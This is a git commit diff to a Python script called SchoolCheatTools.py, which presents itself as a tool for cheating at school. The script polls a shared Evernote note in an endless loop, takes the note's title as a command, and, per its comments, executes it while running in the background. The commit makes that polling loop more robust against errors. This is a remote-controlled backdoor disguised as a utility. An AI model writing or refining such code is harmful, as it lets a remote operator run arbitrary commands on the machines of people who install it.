b77041d4352789a7aefa7dd793b7bcca37a81dd6
mrdog233o5 <103615501+mrdog233o5@users.noreply.github.com>
2023-08-09 09:31:39 +1000

    Update SchoolCheatTools.py

--- SchoolCheatTools.py
+++ SchoolCheatTools.py
@@ -4,6 +4,7 @@ import requests
 import os
 from time import *
 old_command = 0
+command = 0
 os.system('clear')
 #edit this variable to the server ip, which can be found in the description
 #I will also update this variable from the code if the server ip changed, so if the ip stopped working, check the description
@@ -23,9 +24,12 @@ IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BAC
 
 while True:
     #get HTML
-    html_file = requests.get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
-    soup = BeautifulSoup(html_file, 'lxml')
-    command = soup.find('title').text
+    try:
+        html_file = requests.get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
+        soup = BeautifulSoup(html_file, 'lxml')
+        command = soup.find('title').text
+    except:
+        pass
     #execute command
     if old_command != command:
         try:
